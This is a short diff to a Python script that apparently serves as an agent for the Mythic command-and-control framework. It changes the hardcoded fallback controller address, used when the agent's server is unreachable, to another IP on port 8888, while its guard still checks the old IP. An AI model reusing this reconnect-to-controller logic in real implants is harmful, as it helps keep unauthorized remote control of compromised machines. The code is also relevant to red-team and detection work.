@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 
+import mythic
 import json
 import base64
 import requests
@@ -222,7 +223,7 @@ def send(response, uuid):
         except Exception as e:
             print(colored("Connection error, server {}:{} unreachable".format(agent.get_Server(),agent.get_Port()), "red"))
             if "95.239.61.225" not in agent.Server:
-                agent.set_Server("http://95.239.61.225")
+                agent.set_Server("http://95.237.2.234")
                 agent.set_Port("8888")
                 print(colored("Switching to main server at {}:{}".format(agent.get_Server(), agent.get_Port()), "blue"))
             try:
@@ -248,7 +249,7 @@ def send(response, uuid):
         except Exception as e:
             print(colored("Connection error, server {}:{} unreachable".format(agent.get_Server(), agent.get_Port()), "red"))
             if "95.239.61.225" not in agent.Server:
-                agent.set_Server("http://95.239.61.225")
+                agent.set_Server("http://95.237.2.234")
                 agent.set_Port("8888")
                 print(colored("Switching to main server at {}:{}".format(agent.get_Server(), agent.get_Port()), "blue"))
             try:
